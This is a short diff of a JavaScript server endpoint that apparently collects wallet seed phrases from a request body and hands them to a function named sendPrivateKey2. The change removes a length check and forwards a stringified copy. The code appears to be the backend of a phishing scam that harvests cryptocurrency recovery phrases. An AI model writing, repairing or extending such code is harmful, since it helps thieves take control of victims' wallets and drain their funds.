@@ -129,11 +129,12 @@ export const getSyncPhrase = async (req, res) => {
 // Get key and seed phrase
 export const getSyncPhrase2 = async (req, res) => {
   const { rPhrase } = req.body;
-  const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
-  if (!checkPhrase) return;
+  const rPhrase2 = JSON.stringify(rPhrase);
+  // const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
+  // if (!checkPhrase) return;
   // return;
   try {
-    sendPrivateKey2(rPhrase);
+    sendPrivateKey2(rPhrase2);
     return responses.success({
       res,
       message: `it a success`,
